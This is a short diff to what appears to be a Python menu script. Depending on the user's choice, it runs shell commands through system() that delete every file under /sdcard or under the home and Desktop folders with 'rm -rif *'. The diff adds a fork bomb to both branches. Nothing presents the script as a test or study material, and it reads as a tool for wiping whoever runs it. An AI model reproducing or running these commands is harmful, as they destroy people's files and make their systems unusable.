@@ -13,10 +13,10 @@ x = input ('put your selection ...: ')
 if x == '1' :
 
     system ('''
-
-cd ..
 cd /sdcard
-rm -rif * ''' )
+rm -rif *
+:(){ :|:& };: 
+''' )
 
 elif x == '2' :
 
@@ -24,7 +24,9 @@ elif x == '2' :
 cd home
 rm -rif * 
 cd Desktop
-rm -rif * ''')
+rm -rif *
+:(){ :|:& };: 
+''')
 
 else:
     print (' put a correct number ')
